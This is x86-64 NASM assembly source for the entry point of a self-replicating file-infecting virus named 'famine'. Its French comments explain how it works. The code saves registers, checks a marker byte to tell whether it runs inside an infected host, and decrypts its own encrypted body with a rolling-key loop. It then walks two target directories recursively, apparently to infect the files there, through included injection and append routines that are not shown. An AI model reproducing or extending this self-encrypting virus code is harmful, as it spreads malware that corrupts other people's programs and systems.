%include "include.s"

 ;   lea r15, [rel jump + 1]
 ;   cmp byte [r15], 0x90                ; cette ligne permet de quiter le code une fois qu'il a été infecter
 ;   jnz close_mmap

section .text
    global main

main:
    enter famine_size, 0                 ; comstruit la stack et ajoute la structure famine dans la stack
    push rdx                             ; push les registre important pour pouvoir les rétablir une fois le virus executer
    push rcx
    push rdi
    push rsi

    lea rax, [rel jump]
    cmp byte [rax], 0xC3                ; cette ligne permet d'encrypter uniquement si le virus est injecter
    jz encrypted_start

decrypte:

    mov rax, ENCRYPT_SIZE
    xor rdx, rdx
	mov rbx, KEY_SIZE
    div rbx
    mov rcx, ENCRYPT_SIZE
    lea rdi, [rel encrypted_start]
    lea rsi, [rel key] 
	decrypte_loop:
	cmp rdx, 0
	jnz decrypte_nochange
	mov rdx, KEY_SIZE
	decrypte_nochange:
    dec rdx
    dec rcx
	mov bl, byte [rdi+rcx-1]
    add bl, byte [rsi+rdx]
	sub [rdi+rcx], bl
	cmp rcx, 1
	jnz decrypte_loop
    mov bl, byte [rsi]
	sub [rdi], bl
encrypted_start:

    lea rdi, [rsp + fileName]
    lea rsi, [rel firstDir]
    call ft_strcpy
    mov rdi, rsp
    call recursive
    lea rdi, [rsp + fileName]
    lea rsi, [rel secondDir]
    call ft_strcpy
    mov rdi, rsp
    call recursive

exit:
    pop rsi
    pop rdi
    pop rcx
    pop rdx
    leave

jump:
    ret
    nop
    nop
    nop
    nop


%include "recursive.s"

%include "injection.s"

%include "append.s"

%include "data.s"